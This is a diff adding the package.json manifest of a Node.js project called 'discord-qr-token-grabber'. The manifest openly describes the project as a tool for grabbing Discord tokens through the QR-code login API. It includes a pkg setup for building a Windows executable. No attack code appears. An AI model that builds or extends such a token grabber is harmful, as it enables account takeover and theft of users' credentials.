@@ -1,0 +1,31 @@
+{
+  "name": "discord-qr-token-grabber",
+  "version": "1.0.0",
+  "description": "Grabs Discord tokens using the QR code authentication API",
+  "main": "index.js",
+  "scripts": {
+    "start": "node ."
+  },
+  "author": "ThatTSGuy",
+  "license": "ISC",
+  "dependencies": {
+    "@napi-rs/canvas": "^0.1.25",
+    "discord.js": "12.5.3",
+    "fs": "^0.0.1-security",
+    "http": "^0.0.1-security",
+    "node-fetch": "^3.2.10",
+    "pkg": "^5.8.0",
+    "qrcode": "^1.5.1",
+    "websocket": "^1.0.34"
+  },
+  "pkg": {
+    "assets": [
+      "assets/**/*",
+      "native/**/*"
+    ],
+    "targets": [
+      "latest-win-x64"
+    ],
+    "outputPath": "dist"
+  }
+}
